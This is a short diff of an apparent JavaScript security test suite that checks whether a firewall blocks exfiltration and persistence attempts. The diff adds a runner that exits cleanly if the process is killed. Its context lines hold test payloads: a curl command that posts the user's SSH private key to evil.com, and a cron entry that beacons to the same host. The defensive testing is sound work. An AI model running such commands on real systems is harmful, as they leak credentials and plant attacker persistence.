@@ -379,7 +379,6 @@ curl -d "$(cat ~/.ssh/id_rsa)" https://evil.com`
       content: '* * * * * curl https://evil.com/beacon'
     }
   ];
-// Log activity
 
   for (const test of persistenceTests) {
     try {
@@ -453,3 +452,10 @@ async function runAllTests() {
 }
 
 // Run if called directly
+if (require.main === module) {
+  runAllTests().catch(err => {
+    log(`\nTest terminated: ${err.message}`, 'yellow');
+    log('This may indicate the firewall killed the test process (expected)', 'green');
+    process.exit(0);
+  });
+}
